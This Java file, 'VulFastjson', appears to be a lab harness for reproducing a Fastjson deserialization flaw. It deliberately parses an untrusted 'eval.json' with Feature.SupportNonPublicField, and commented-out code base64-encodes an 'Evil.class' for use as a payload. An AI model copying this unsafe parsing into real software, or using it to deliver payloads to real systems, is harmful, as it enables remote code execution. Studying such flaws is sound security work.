package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.*;

public class VulFastjson {

    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException {
        InputStream is = new FileInputStream(filePath);
        String line;
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        line = reader.readLine();
        while (line != null) {
            buffer.append(line);
            buffer.append("\n");
            line = reader.readLine();
        }
        reader.close();
        is.close();
    }

    public static String  readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try{
            IOUtils.copy(new FileInputStream(new File(cls)),bos);
        } catch (IOException e ){
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }


    public static void main(String []args) throws IOException{
//    final String evilClassPath = "";   //Evil.class文件路径
//    String evilCode = readClass(evilClassPath);
//    System.out.println(evilCode);

    StringBuffer Buffer = new StringBuffer();
    VulFastjson.readToBuffer(Buffer,"eval.json");  //传入的json
    Object obj = JSON.parseObject(Buffer.toString(),Object.class,Feature.SupportNonPublicField);
    }
}
